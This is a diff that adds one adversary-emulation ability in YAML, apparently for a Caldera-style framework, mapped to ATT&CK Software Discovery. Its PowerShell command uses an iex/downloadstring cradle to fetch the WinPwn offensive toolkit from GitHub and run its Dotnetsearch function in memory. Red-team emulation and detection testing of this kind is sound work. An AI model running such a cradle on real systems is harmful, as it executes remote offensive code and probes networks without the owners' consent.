@@ -1,0 +1,19 @@
+---
+- id: fe0db5a85a3290ee522b3db62d9957cd
+  name: WinPwn - Dotnetsearch
+  description: Search for any .NET binary file in a share using the Dotnetsearch function
+    of WinPwn
+  tactic: discovery
+  technique:
+    attack_id: T1518
+    name: Software Discovery
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          Dotnetsearch -noninteractive -consoleoutput
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
